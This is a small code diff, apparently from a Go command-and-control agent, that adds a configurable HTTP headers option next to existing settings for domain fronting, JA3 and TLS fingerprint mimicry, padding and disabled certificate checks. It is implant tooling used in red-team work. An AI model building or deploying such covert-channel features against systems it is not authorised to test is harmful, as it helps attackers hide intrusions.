@@ -48,6 +48,9 @@ var auth = "rsa"
 // debug a boolean value that determines if the Agent will print debug output
 var debug = "false"
 
+// headers is a list of HTTP headers that the agent will use with the HTTP protocol to communicate with the server
+var headers = ""
+
 // host a specific HTTP header used with HTTP communications; notably used for domain fronting
 var host string
 
@@ -148,6 +151,7 @@ func main() {
 			JA3:          ja3,
 			Parrot:       parrot,
 			Host:         host,
+			Headers:      headers,
 			Proxy:        proxy,
 			Padding:      padding,
 			InsecureTLS:  !verify,
